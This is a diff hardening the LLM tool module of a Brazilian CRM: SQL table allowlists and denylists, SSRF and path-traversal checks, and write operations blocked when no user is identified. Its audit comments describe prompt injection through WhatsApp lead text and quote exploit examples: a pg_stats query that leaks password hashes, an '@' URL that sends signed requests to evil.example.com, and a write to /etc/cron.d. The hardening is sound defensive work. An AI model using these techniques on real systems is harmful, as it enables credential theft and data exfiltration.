@@ -1,14 +1,18 @@
 import contextvars
 import logging
+import os
+import pathlib
 import re
 import time
+import uuid
 
 import sqlalchemy as sa
 from sqlalchemy.orm import Session
+from sqlalchemy.orm.attributes import flag_modified
 from sqlalchemy import text, create_engine
 from sqlalchemy.exc import OperationalError, SQLAlchemyError
 from app.database import engine, SessionLocal, IS_SQLITE
-from app.config import DATABASE_URL, DATABASE_READONLY_URL
+from app.config import DATABASE_URL, DATABASE_READONLY_URL, ENVIRONMENT
 from app.models.lead import Lead
 from app.models.tag import Tag
 from app.models.task import Task
@@ -22,14 +26,36 @@ from app.services.internal_ai_auth import (
 import json
 import urllib.request
 import urllib.error
+from urllib.parse import urlsplit
 
 logger = logging.getLogger(__name__)
 
-# Conexão read-only para queries SELECT da IA
+# Conexão read-only para queries SELECT da IA.
+# AUDIT-2026-08-W1C (F5): `DATABASE_READONLY_URL` tem DEFAULT igual a
+# `DATABASE_URL` (app/config.py). Se a env var não for definida em produção, o
+# "engine read-only" seria construído com o usuário DONO do banco (read-write) e
+# a garantia de somente-leitura da IA viraria ficção silenciosa. Aqui recusamos
+# construir o engine nesse cenário: é preferível a ferramenta falhar em voz alta
+# a executar SQL vindo do LLM (e de texto de cliente via n8n) com privilégio de
+# escrita. Em `development` (SQLite/dev local) a igualdade é legítima.
+_read_only_engine_error = None
+
 if IS_SQLITE:
     # SQLite: usar URI mode com ?mode=ro para read-only
     _ro_url = DATABASE_URL.replace("sqlite:///", "sqlite:///file:", 1) + "?mode=ro&uri=true"
     _read_only_engine = create_engine(_ro_url, connect_args={"check_same_thread": False})
+elif ENVIRONMENT != "development" and DATABASE_READONLY_URL == DATABASE_URL:
+    _read_only_engine = None
+    _read_only_engine_error = (
+        "Consulta de leitura desativada: DATABASE_READONLY_URL não está "
+        "configurada (está apontando para a mesma conexão de escrita). "
+        "Configure o usuário crm_readonly no servidor."
+    )
+    logger.error(
+        "[AI SQL READ] Engine read-only NÃO construído (AUDIT-2026-08-W1C/F5): "
+        "DATABASE_READONLY_URL == DATABASE_URL fora de development — a IA "
+        "rodaria SELECTs com o usuário dono do banco."
+    )
 else:
     # PostgreSQL: usar user dedicado read-only (crm_readonly) via DATABASE_READONLY_URL
     _read_only_engine = create_engine(
@@ -79,6 +105,206 @@ def get_ai_user_context():
 # Database Inspector Tool
 # =====================================================================
 
+# AUDIT-2026-08-W1C (F3): tabelas que a IA NUNCA pode ler. `users` guarda
+# hashed_password/api_key; `chat_messages`/`chat_sessions` guardam conversas
+# privadas de outros usuários. Match por word boundary + case-insensitive (pega
+# `FROM users`, `JOIN Users u`, `users.api_key`) e a query é REJEITADA, nunca
+# reescrita.
+#
+# AUDIT-2026-08-WF2: entraram também os nomes de CATÁLOGO (`pg_*`,
+# `information_schema`, `sqlite_*`) — ver `_ALLOWED_TABLES` abaixo para o porquê.
+# Esta denylist é o CINTO: pega o nome em QUALQUER posição da query, inclusive
+# onde ele não é uma tabela e o parser da allowlist não olha
+# (`to_regclass('users')`, `'users'::regclass`, `has_table_privilege('users',…)`).
+_FORBIDDEN_TABLES = re.compile(
+    r'\b(users|chat_messages|chat_sessions'
+    r'|pg_[a-z_]+|information_schema|sqlite_[a-z_]+)\b',
+    re.IGNORECASE,
+)
+
+# --- AUDIT-2026-08-WF2: allowlist de tabelas de negócio -------------------
+#
+# O DEFEITO: a denylist acima casa o NOME da tabela. As views de catálogo do
+# PostgreSQL entregam o CONTEÚDO de `users` sem que a palavra `users` apareça:
+#
+#     SELECT tablename, attname, most_common_vals, histogram_bounds FROM pg_stats
+#
+# `pg_stats` filtra por `has_column_privilege(..., 'select')` e o grant do banco
+# é `SELECT ON ALL TABLES IN SCHEMA public` (docker/postgres/init.sql), então
+# `users.hashed_password` e `users.api_key` passam no filtro e aparecem
+# literalmente em `most_common_vals` (tabela pequena) ou amostrados em
+# `histogram_bounds`. Explora quem tiver login no CRM (`POST /api/ai/chat` só
+# exige `get_current_user`) — ou ninguém, via prompt injection no texto de um
+# lead vindo do WhatsApp, que a IA lê e obedece.
+#
+# A DECISÃO: inverter para ALLOWLIST. Ampliar a denylist é corrida perdida
+# (pg_class, pg_attribute, pg_stat_user_tables, pg_stats_ext, information_schema,
+# sqlite_master — e amanhã outra view). A allowlist é fechada por construção.
+#
+# Esta lista é EXATAMENTE o que `get_database_schema()` anuncia à IA: tabela que
+# não é anunciada não é consultável. Mexeu numa, mexa na outra.
+_ALLOWED_TABLES = frozenset({
+    "leads", "tags", "lead_tags", "tasks", "funnels", "funnel_entries", "segments",
+})
+
+# Só o schema padrão de cada dialeto. `pg_catalog.pg_stats` e
+# `information_schema.columns` morrem aqui mesmo.
+_ALLOWED_SCHEMAS = frozenset({"public", "main"})
+_ALLOWED_TABLES_MSG = ", ".join(sorted(_ALLOWED_TABLES))
+
+# POR QUE A ALLOWLIST FECHA O VETOR: num SELECT o nome da tabela é um
+# IDENTIFICADOR literal — não há como computá-lo em tempo de execução.
+# `'us' || 'ers'` só concatena em posição de VALOR (por isso a query do achado
+# usa a concatenação no WHERE, e não no FROM) e `to_regclass('users')` devolve um
+# OID, não linhas. Logo o conjunto de tabelas que a query lê está inteiramente
+# escrito nela: conferir cada posição de tabela é conferir tudo.
+#
+# O QUE ELA NÃO COBRE:
+#  - o GRANT do banco continua `SELECT ON ALL TABLES` — este guard é de
+#    APLICAÇÃO. Revogá-lo segue sendo ação de operador (docker/postgres/init.sql)
+#    e continua sendo o que protege quem chega ao banco por FORA desta função.
+#  - abuso das tabelas PERMITIDAS: ler todos os leads é permitido por design.
+#  - as outras ferramentas da IA — `call_internal_api` tem os guards dela.
+#  - o tokenizador abaixo é um parser APROXIMADO de SQL. Ele erra sempre para o
+#    lado de BLOQUEAR: o que não souber classificar em posição de tabela é
+#    recusado. O custo de um erro é uma consulta exótica negada (CTE, `LATERAL`,
+#    `FROM ONLY`, comentário no meio da query) — nunca um vazamento.
+
+# Comentário SQL é recusado antes de tokenizar: ele serve para colar tokens sem
+# espaço (`FROM/**/pg_stats`) e para esconder vírgulas de lista de tabelas.
+# Nenhuma consulta analítica da IA precisa comentar código.
+_SQL_COMMENT_RE = re.compile(r"--|/\*|\*/")
+
+_SQL_TOKEN_RE = re.compile(
+    r"""(?P<ws>\s+)
+      | (?P<str>'(?:[^']|'')*')
+      | (?P<qident>"(?:[^"]|"")*")
+      | (?P<word>[A-Za-z_][A-Za-z0-9_]*)
+      | (?P<other>.)""",
+    re.VERBOSE | re.DOTALL,
+)
+
+# Palavras depois das quais vem uma TABELA. `table` entra porque
+# `SELECT * FROM (TABLE users) t` lê a tabela sem escrever `FROM users`.
+_TABLE_KEYWORDS = frozenset({"from", "join", "table"})
+
+# Palavras que ENCERRAM a lista de tabelas do FROM: depois delas uma vírgula
+# separa colunas (`ORDER BY a, b`), não tabelas.
+_END_OF_TABLE_LIST = frozenset({
+    "where", "group", "having", "order", "limit", "offset",
+    "union", "intersect", "except", "window", "fetch",
+})
+
+# As ÚNICAS construções do SQL padrão em que `FROM` aparece DENTRO de parênteses
+# sem introduzir tabela: `EXTRACT(MONTH FROM data_chegada)`,
+# `SUBSTRING(x FROM 2)`, `TRIM(BOTH ' ' FROM x)`, `OVERLAY(...)`, `POSITION(...)`.
+# Sem esta exceção, "leads por mês" — consulta óbvia da IA — seria bloqueada.
+# A exceção é segura porque o argumento dessas funções é uma EXPRESSÃO: para ler
+# uma tabela ali seria preciso abrir uma subquery, que abre um parêntese novo, e
+# esse nível já não é funcional (o `FROM` interno volta a ser analisado).
+_EXPR_FROM_FUNCTIONS = frozenset({
+    "extract", "substring", "trim", "overlay", "position",
+})
+
+
+def _normalize_ident(token: str) -> str:
+    """Reduz um identificador (com ou sem aspas) à forma comparável."""
+    if token.startswith('"'):
+        token = token[1:-1].replace('""', '"')
+    return token.lower()
+
+
+def _referenced_tables(query: str) -> list:
+    """Devolve as tabelas citadas em POSIÇÃO DE TABELA na query.
+
+    Levanta `ValueError` quando encontra algo que não sabe classificar em
+    posição de tabela — o chamador trata isso como bloqueio (fail-closed).
+    """
+    tokens = [
+        (m.lastgroup, m.group())
+        for m in _SQL_TOKEN_RE.finditer(query)
+        if m.lastgroup != "ws"
+    ]
+
+    tabelas = []
+    esperando_tabela = False
+    # Uma entrada por nível de parênteses: [vírgula aqui separa tabelas?,
+    # este nível é argumento de EXTRACT/SUBSTRING/...?]. A subquery abre nível
+    # próprio, então `IN (1, 2)` nunca vira lista de tabelas.
+    escopos = [[False, False]]
+
+    i = 0
+    while i < len(tokens):
+        kind, value = tokens[i]
+        anterior = tokens[i - 1][1].lower() if i else ""
+        i += 1
+
+        if esperando_tabela:
+            esperando_tabela = False
+            if value == "(":
+                # Subquery ou parêntese de agrupamento: o FROM interno é
+                # visitado por este mesmo laço.
+                escopos.append([False, False])
+                continue
+            if kind not in ("word", "qident"):
+                raise ValueError(f"token inesperado em posição de tabela: {value!r}")
+            nome = _normalize_ident(value)
+            while (i + 1 < len(tokens) and tokens[i][1] == "."
+                   and tokens[i + 1][0] in ("word", "qident")):
+                nome += "." + _normalize_ident(tokens[i + 1][1])
+                i += 2
+            tabelas.append(nome)
+            continue
+
+        if value == "(":
+            escopos.append([False, anterior in _EXPR_FROM_FUNCTIONS])
+        elif value == ")":
+            if len(escopos) > 1:
+                escopos.pop()
+        elif value == ",":
+            esperando_tabela = escopos[-1][0]
+        elif kind == "word":
+            palavra = value.lower()
+            if palavra in _TABLE_KEYWORDS and not escopos[-1][1]:
+                esperando_tabela = True
+                escopos[-1][0] = palavra != "table"
+            elif palavra in _END_OF_TABLE_LIST:
+                escopos[-1][0] = False
+
+    if esperando_tabela:
+        raise ValueError("query termina esperando um nome de tabela")
+    return tabelas
+
+
+def _blocked_table_reason(query: str):
+    """Mensagem de bloqueio (PT-BR) da allowlist, ou None se a query é aceita."""
+    if _SQL_COMMENT_RE.search(query):
+        return (
+            "Consulta bloqueada: comentários SQL (`--`, `/* */`) não são aceitos. "
+            "Reescreva a consulta sem comentários."
+        )
+    try:
+        tabelas = _referenced_tables(query)
+    except ValueError:
+        return (
+            "Consulta bloqueada: não foi possível identificar com segurança as "
+            f"tabelas consultadas. Tabelas disponíveis: {_ALLOWED_TABLES_MSG}."
+        )
+    for nome in tabelas:
+        partes = nome.split(".")
+        permitida = (
+            (len(partes) == 1 and partes[0] in _ALLOWED_TABLES)
+            or (len(partes) == 2 and partes[0] in _ALLOWED_SCHEMAS
+                and partes[1] in _ALLOWED_TABLES)
+        )
+        if not permitida:
+            return (
+                f"Consulta bloqueada: a tabela `{nome[:64]}` não está disponível "
+                f"para a IA. Tabelas disponíveis: {_ALLOWED_TABLES_MSG}."
+            )
+    return None
+
+
 def get_database_schema() -> str:
     """
     Retorna o schema do banco de dados (tabelas e colunas importantes)
@@ -90,10 +316,19 @@ def get_database_schema() -> str:
     - tags (id, nome, cor, created_at)
     - lead_tags (lead_id, tag_id)
     - tasks (id, title, description, due_date, status [pending, in_progress, completed], lead_id, assigned_to_id)
-    - funnels (id, nome, descricao, is_default, is_active)
-    - funnel_entries (id, funnel_id, lead_id, etapa_id [nova_oportunidade, contato_feito, em_negociacao, proposta_enviada, follow_up, fechou_venda, perda])
+    - funnels (id, nome, etapas, is_active, created_at, updated_at)
+    - funnel_entries (id, funnel_id, lead_id, etapa_id, posicao, created_at, updated_at)
+      etapa_id e TEXTO LIVRE: corresponde a um `id` dentro do JSON `funnels.etapas`,
+      que cada funil define do seu jeito. NAO existe lista fixa de etapas — para
+      saber as de um funil, leia `funnels.etapas`.
     - segments (id, nome, rules [JSON])
-    - users (id, name, email, is_active, role [admin, agent])
+
+    OBS (AUDIT-2026-08-W1C/F3 + AUDIT-2026-08-WF2): a IA só consegue consultar as
+    tabelas listadas acima. QUALQUER outra é bloqueada no servidor — inclusive
+    `users` e `chat_messages` (hashes de senha, API keys, conversas privadas) e as
+    views de catálogo do banco (`pg_stats`, `pg_class`, `pg_stat_user_tables`,
+    `information_schema.*`, `sqlite_master`), que expõem amostras do conteúdo
+    dessas mesmas tabelas.
     """
     return schema
 
@@ -116,10 +351,57 @@ def run_select_query(query: str) -> str:
         return json.dumps({"error": "Apenas consultas SELECT são permitidas."})
     
     # Bloquear subqueries destrutivas
-    _dangerous = re.compile(r'\b(insert|update|delete|drop|alter|create|attach|pragma|truncate)\b', re.IGNORECASE)
+    # AUDIT-2026-08-F2: `into` entrou na lista, junto de copy/grant/revoke.
+    # `SELECT * INTO copia FROM leads` passava por TODOS os guards acima —
+    # comeca com select, sem ponto e virgula, nenhuma palavra da lista antiga.
+    # No SQLite isso e erro de sintaxe, entao a suite nunca viu problema; no
+    # PostgreSQL e DDL: CRIA TABELA. Repare que `attach` e `pragma` so existem
+    # no SQLite — a lista protegia o dialeto de desenvolvimento e deixava o de
+    # producao aberto. Nenhuma consulta de leitura legitima usa INTO.
+    _dangerous = re.compile(
+        r'\b(insert|update|delete|drop|alter|create|attach|pragma|truncate'
+        r'|into|copy|grant|revoke)\b',
+        re.IGNORECASE,
+    )
     if _dangerous.search(query):
         return json.dumps({"error": "Query contém palavras-chave não permitidas para leitura."})
     
+    # AUDIT-2026-08-W1C (F3): não havia NENHUMA allowlist/denylist de tabelas e o
+    # grant do banco é `SELECT ON ALL TABLES` (docker/postgres/init.sql), então
+    # `SELECT email, hashed_password, api_key FROM users` passava por todos os
+    # guards acima. Como a IA lê texto que chega do WhatsApp via n8n, uma prompt
+    # injection bastava para exfiltrar hashes e API keys. Rejeitamos (não
+    # sanitizamos: reescrever a query esconde a tentativa e é contornável).
+    #
+    # AUDIT-2026-08-WF2: aqui se afirmava que a query era REJEITADA e que só
+    # faltava o operador revogar o grant. Era falso para o vetor de catálogo —
+    # `SELECT most_common_vals FROM pg_stats` entrega o conteúdo de `users` sem
+    # citar `users`, e passava por este guard. A denylist virou o CINTO (pega o
+    # nome em qualquer posição) e a allowlist abaixo é o fecho estrutural.
+    # Revogar o grant continua valendo, mas já não é o único fecho deste vetor.
+    if _FORBIDDEN_TABLES.search(query):
+        logger.warning(f"[AI SQL READ BLOCKED] nome sensível referenciado: {query[:200]}")
+        return json.dumps({
+            "error": (
+                "Consulta bloqueada: `users`, `chat_messages`/`chat_sessions` e as "
+                "views de catálogo do banco (pg_*, information_schema, sqlite_*) "
+                "contêm credenciais, conversas privadas e amostras do conteúdo das "
+                "demais tabelas — não podem ser lidas pela IA."
+            )
+        })
+
+    # AUDIT-2026-08-WF2: allowlist estrutural de tabelas — ver `_ALLOWED_TABLES`.
+    motivo_bloqueio = _blocked_table_reason(query)
+    if motivo_bloqueio:
+        logger.warning(
+            f"[AI SQL READ BLOCKED] {motivo_bloqueio[:160]} | query: {query[:200]}"
+        )
+        return json.dumps({"error": motivo_bloqueio})
+
+    # AUDIT-2026-08-W1C (F5): sem engine read-only confiável, não rodamos nada.
+    if _read_only_engine is None:
+        return json.dumps({"error": _read_only_engine_error})
+
     try:
         with _read_only_engine.connect() as conn:
             result = conn.execute(text(query))
@@ -159,29 +441,77 @@ def run_select_query(query: str) -> str:
 # Operational Tools
 # =====================================================================
 
+# AUDIT-2026-08-W1C (F6): `status_venda` era uma string LIVRE vinda do LLM.
+# `app/routers/analytics.py` só conta 'em_negociacao', 'venda' e 'perda' — um
+# status inventado pela IA faz o lead sumir de TODOS os totais dos dashboards
+# (não some do banco, some dos números que o gestor usa para decidir).
+_ALLOWED_STATUS_VENDA = {"em_negociacao", "venda", "perda"}
+
+
+def _require_ai_user_context():
+    """AUDIT-2026-08-W1C (F6): retorna erro JSON se não houver usuário da IA.
+
+    Estes 4 helpers abrem `SessionLocal()` e mutam o ORM direto, fora das rotas
+    oficiais — sem authz, sem filtro de propriedade, sem auditoria, sem os
+    efeitos colaterais do n8n (ver o comentário do próprio módulo logo acima de
+    `update_lead_status`). Enquanto não são reescritos sobre `call_internal_api`,
+    exigimos no mínimo um usuário identificado: escrita anônima disparada por
+    prompt injection fica bloqueada e o log tem a quem atribuir.
+    """
+    ctx = get_ai_user_context()
+    if not ctx or not ctx.get("user_id"):
+        return json.dumps({
+            "error": (
+                "Operação de escrita bloqueada: contexto do usuário da IA ausente. "
+                "Nenhuma alteração pode ser feita sem um usuário identificado."
+            )
+        })
+    return None
+
+
 def update_lead_status(lead_id: int, status_venda: str = None, cancel_reason: str = None) -> str:
     """
     Atualiza o campo status_venda de um lead existente.
     
     Args:
         lead_id: O ID do lead.
-        status_venda: O novo status de venda (ex: 'venda', 'em_negociacao', 'perda', 'arquivado').
+        status_venda: O novo status de venda. Apenas 'em_negociacao', 'venda' ou 'perda'.
         cancel_reason: Opcional, motivo caso seja perda.
     """
+    denied = _require_ai_user_context()
+    if denied:
+        return denied
+
+    # AUDIT-2026-08-W1C (F6): whitelist explícita — ver _ALLOWED_STATUS_VENDA.
+    if status_venda and status_venda not in _ALLOWED_STATUS_VENDA:
+        return json.dumps({
+            "error": (
+                f"status_venda inválido: '{status_venda}'. "
+                f"Valores permitidos: {sorted(_ALLOWED_STATUS_VENDA)}."
+            )
+        })
+
     db = SessionLocal()
     try:
         lead = db.query(Lead).filter(Lead.id == lead_id).first()
         if not lead:
             return json.dumps({"error": f"Lead {lead_id} não encontrado."})
-        
+
         if status_venda:
             lead.status_venda = status_venda
-            
+
         if cancel_reason:
             if not lead.campos_personalizados:
                 lead.campos_personalizados = {}
             lead.campos_personalizados['motivo_perda'] = cancel_reason
-            
+            # AUDIT-2026-08-W1C (F7): `campos_personalizados` é uma coluna JSON
+            # simples (não MutableDict). Mutar o dict IN PLACE não marca o
+            # atributo como sujo, então o commit não gerava UPDATE e o motivo da
+            # perda era DESCARTADO — mas a ferramenta respondia "sucesso" para o
+            # LLM. Só era visível quando o dict já tinha conteúdo (com dict vazio
+            # a atribuição `= {}` acima já marcava o atributo).
+            flag_modified(lead, "campos_personalizados")
+
         db.commit()
         return json.dumps({"success": True, "message": f"Lead {lead_id} atualizado."})
     finally:
@@ -197,6 +527,10 @@ def create_task(lead_id: int, title: str, description: str, due_date: str) -> st
         description: A descrição da tarefa.
         due_date: A data/hora limite da tarefa no formato YYYY-MM-DDTHH:MM:SS.
     """
+    denied = _require_ai_user_context()
+    if denied:
+        return denied
+
     db = SessionLocal()
     try:
         from datetime import datetime
@@ -222,6 +556,10 @@ def add_tag_to_lead(lead_id: int, tag_nome: str) -> str:
     """
     Adiciona uma tag ao lead e cria a tag caso ela não exista.
     """
+    denied = _require_ai_user_context()
+    if denied:
+        return denied
+
     db = SessionLocal()
     try:
         tag_nome = tag_nome.strip()
@@ -259,8 +597,22 @@ def create_lead(nome: str, email: str = None, whatsapp: str = None, destinos: st
         data_chegada: Data de chegada no formato YYYY-MM-DD.
         data_partida: Data de partida no formato YYYY-MM-DD.
         tag: Opcional, nome da tag principal a ser vinculada ao lead criado (Ex: "Atacama").
-        status_venda: Status inicial do funil ('em_negociacao', 'venda', etc).
+        status_venda: Status inicial do funil. Apenas 'em_negociacao', 'venda' ou 'perda'.
     """
+    denied = _require_ai_user_context()
+    if denied:
+        return denied
+
+    # AUDIT-2026-08-W1C (F6): mesmo defeito do update — status livre vindo do LLM
+    # cria lead invisível para os dashboards já no nascimento.
+    if status_venda not in _ALLOWED_STATUS_VENDA:
+        return json.dumps({
+            "error": (
+                f"status_venda inválido: '{status_venda}'. "
+                f"Valores permitidos: {sorted(_ALLOWED_STATUS_VENDA)}."
+            )
+        })
+
     db = SessionLocal()
     try:
         from datetime import datetime
@@ -268,25 +620,34 @@ def create_lead(nome: str, email: str = None, whatsapp: str = None, destinos: st
         d_partida = datetime.fromisoformat(data_partida).date() if data_partida else None
         lista_destinos = [d.strip() for d in destinos.split(",")] if destinos else []
 
-        lead = Lead(
-            nome=nome,
-            email=email,
-            whatsapp=whatsapp,
-            destinos=lista_destinos,
-            data_chegada=d_chegada,
-            data_partida=d_partida,
-            campos_personalizados={},
-            status_venda=status_venda
+        # AUDIT-2026-08-WB — mesmo defeito do F-341, aqui tambem.
+        #
+        # Esta ferramenta montava um `Lead(...)` cru e commitava: sem
+        # `FunnelEntry`, sem `LeadHistory`, sem tag de origem. O lead nascia
+        # FORA do Kanban — o pipeline so renderiza quem tem entry, e
+        # `GET /api/pipeline/locate/{id}` devolve 404 sem ela. Um lead criado
+        # pela Perpetua simplesmente nao existia para o time de vendas.
+        #
+        # Agora usa o mesmo `criar_lead` de `POST /api/leads` e do importador:
+        # um caminho so, e ele nao pode divergir de novo.
+        from app.services.lead_creation import criar_lead
+
+        lead = criar_lead(
+            db,
+            dados={
+                "nome": nome,
+                "email": email,
+                "whatsapp": whatsapp,
+                "destinos": lista_destinos,
+                "data_chegada": d_chegada,
+                "data_partida": d_partida,
+                "campos_personalizados": {},
+                "status_venda": status_venda,
+            },
+            tag_nome=tag or None,
+            origem="ia",
         )
-        db.add(lead)
-        db.commit()
-        db.refresh(lead)
-        
-        # Se uma tag foi pedida, nós reaproveitamos a lógica de adicao
-        if tag:
-            db.close() # close early here
-            return add_tag_to_lead(lead.id, tag)
-            
+
         return json.dumps({"success": True, "lead_id": lead.id, "message": f"Lead '{nome}' criado."})
     except Exception as e:
         db.rollback()
@@ -334,6 +695,53 @@ def get_api_endpoints() -> str:
     except Exception as e:
         return json.dumps({"error": f"Falha ao ler OpenAPI docs: {str(e)}"})
 
+# AUDIT-2026-08-W1C (F1): o guard antigo (`path.startswith("http")` + `".." in
+# path`) era contornado por um `@` inicial: `urlsplit(
+# "http://127.0.0.1:8000@evil.example.com/steal").hostname == "evil.example.com"`.
+# Como a requisição sai ASSINADA com os headers internos HMAC, uma prompt
+# injection (texto de cliente vindo do WhatsApp/n8n) exfiltrava os dados E uma
+# assinatura reutilizável por 300s. Agora exigimos um caminho com formato
+# estrito; `@`, `\`, `//`, `:` e caracteres de controle ficam de fora do
+# conjunto permitido. Query string é aceita separadamente.
+_INTERNAL_PATH_RE = re.compile(r"^/[A-Za-z0-9_.~/-]*(\?[A-Za-z0-9_.~%=&+,:/-]*)?$")
+
+# AUDIT-2026-08-W1C (F4): `POST /api/auth/token` emite uma API Key em texto
+# puro, sem expiração e com privilégio total, e exige apenas `get_current_user`
+# — que a identidade HMAC interna satisfaz. Ou seja, a Perpétua podia cunhar uma
+# credencial permanente e imprimi-la no chat. Nenhuma rota /api/auth/ tem uso
+# legítimo pela IA, e DELETE nunca é reversível: negados antes de assinar.
+_DENIED_PATH_PREFIXES = ("/api/auth/",)
+_DENIED_METHODS = {"DELETE"}
+
+_BASE_INTERNAL_URL = "http://127.0.0.1:8000"
+
+
+def _validate_internal_call(method: str, path: str):
+    """Valida method/path de `call_internal_api`. Retorna erro (str) ou None.
+
+    Exposto no módulo para permitir teste direto do guard (AUDIT-2026-08-W1C),
+    sem depender de o servidor HTTP estar de pé.
+    """
+    if not isinstance(path, str) or not path.startswith("/") or path.startswith("//"):
+        return "Path inválido. Use apenas caminhos relativos como /api/leads."
+    if ".." in path or not _INTERNAL_PATH_RE.match(path):
+        return "Path inválido. Use apenas caminhos relativos como /api/leads."
+
+    method_u = str(method or "").upper()
+    if method_u in _DENIED_METHODS:
+        return f"Método {method_u} não é permitido para a IA."
+    if any(path.lower().startswith(pfx) for pfx in _DENIED_PATH_PREFIXES):
+        return "Acesso negado: rotas de autenticação não podem ser chamadas pela IA."
+
+    # Cinto e suspensório: mesmo com o padrão acima aprovado, confirmamos que a
+    # URL final resolve para o loopback. Foi exatamente a checagem de padrão que
+    # falhou em F1 — a resolução do host é a defesa que não depende de regex.
+    if urlsplit(_BASE_INTERNAL_URL + path).hostname != "127.0.0.1":
+        return "Path inválido: a requisição interna deve permanecer em 127.0.0.1."
+
+    return None
+
+
 def call_internal_api(method: str, path: str, payload_json: str = None) -> str:
     """
     Faz uma requisição HTTP para a própria API do sistema.
@@ -341,13 +749,15 @@ def call_internal_api(method: str, path: str, payload_json: str = None) -> str:
     A requisição usa o contexto de segurança do usuário atualmente logado.
     
     Args:
-        method: O método HTTP (GET, POST, PUT, DELETE).
-        path: O caminho do endpoint (ex: '/api/leads/segment').
+        method: O método HTTP (GET, POST, PUT). DELETE é bloqueado.
+        path: O caminho do endpoint (ex: '/api/leads/segment'). Rotas /api/auth/ são bloqueadas.
         payload_json: Opcional. Uma string contendo um JSON válido para o body da requisição (ex: '{"nome": "João"}').
     """
-    # Sanitizar path — prevenir SSRF para hosts externos
-    if path.startswith("http") or ".." in path:
-        return json.dumps({"error": "Path inválido. Use apenas caminhos relativos como /api/leads."})
+    # Sanitizar method/path — prevenir SSRF e escalada de privilégio (F1/F4).
+    denied = _validate_internal_call(method, path)
+    if denied:
+        logger.warning(f"[AI API CALL BLOCKED] {str(method).upper()} {str(path)[:200]} -> {denied}")
+        return json.dumps({"error": denied})
 
     # Contexto do usuário logado (setado pelo router de AI). Não depende de API Key.
     ctx = get_ai_user_context()
@@ -373,7 +783,7 @@ def call_internal_api(method: str, path: str, payload_json: str = None) -> str:
         config.INTERNAL_AI_AUTH_SECRET, user_id, timestamp, method_u, path
     )
 
-    url = f"http://127.0.0.1:8000{path}"
+    url = _BASE_INTERNAL_URL + path
 
     headers = {
         'Content-Type': 'application/json',
@@ -419,6 +829,38 @@ def _get_upload_dir():
         UPLOAD_DIR = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), "uploads")
         os.makedirs(UPLOAD_DIR, exist_ok=True)
     return UPLOAD_DIR
+
+# AUDIT-2026-08-W1C (F2 / DOCUMENT-FILENAME-SECURITY-01, já registrado como
+# pendência em docs/perpetua_pdf_generation.md): o nome do arquivo vem 100% do
+# LLM e só passava por `.replace(' ', '_')`. `os.path.join(base, "/etc/cron.d/x")`
+# DESCARTA a base quando o argumento é absoluto, e `../` não era removido — a
+# escrita escapava de uploads/. O caminho de LEITURA (app/routers/ai.py) já usa
+# `os.path.basename`; o buraco era só a escrita, nos dois geradores.
+_SAFE_FILENAME_RE = re.compile(r"[^A-Za-z0-9_-]+")
+
+
+def _safe_document_target(filename: str, extension: str):
+    """Devolve (safe_filename, filepath) confinados ao diretório de uploads.
+
+    Três camadas, na ordem: `os.path.basename` (mata `dir/`), whitelist estrita
+    `[A-Za-z0-9_-]` limitada a 64 chars (mata `..`, `~`, absolutos, unicode,
+    NUL) e, por último, verificação de que o caminho RESOLVIDO fica dentro da
+    base — mesmo padrão de contenção de conversas/app/services/media_storage.py.
+    A terceira camada existe porque foi justamente a validação de padrão que
+    falhou nos achados deste pacote.
+    """
+    base = os.path.basename(str(filename or "")).replace(" ", "_")
+    base = _SAFE_FILENAME_RE.sub("", base)[:64]
+    if not base:
+        base = "documento"
+
+    safe_filename = f"{base}_{uuid.uuid4().hex[:6]}{extension}"
+    upload_dir = pathlib.Path(_get_upload_dir()).resolve()
+    filepath = (upload_dir / safe_filename).resolve()
+    if not filepath.is_relative_to(upload_dir):
+        raise ValueError("Nome de arquivo inválido (path traversal bloqueado).")
+    return safe_filename, str(filepath)
+
 
 def generate_excel_document(filename: str, sheet_name: str, headers: str, rows: str) -> str:
     """
@@ -483,8 +925,7 @@ def generate_excel_document(filename: str, sheet_name: str, headers: str, rows: 
             ws.column_dimensions[col_letter].width = min(max_length + 4, 50)
 
         # Salvar
-        safe_filename = f"{filename.replace(' ', '_')}_{uuid.uuid4().hex[:6]}.xlsx"
-        filepath = os.path.join(_get_upload_dir(), safe_filename)
+        safe_filename, filepath = _safe_document_target(filename, ".xlsx")
         wb.save(filepath)
 
         # Validação pós-save: confirmar que o arquivo foi realmente salvo e é válido
@@ -586,8 +1027,7 @@ def generate_pdf_document(filename: str, title: str, content: str) -> str:
         pdf.set_text_color(150, 150, 150)
         pdf.cell(0, 6, txt="CRM Brasileiros no Atacama - Documento gerado automaticamente pela IA", border=0, ln=1, align="C")
 
-        safe_filename = f"{filename.replace(' ', '_')}_{uuid.uuid4().hex[:6]}.pdf"
-        filepath = os.path.join(_get_upload_dir(), safe_filename)
+        safe_filename, filepath = _safe_document_target(filename, ".pdf")
         pdf.output(filepath)
 
         download_url = f"/api/ai/download/{safe_filename}"
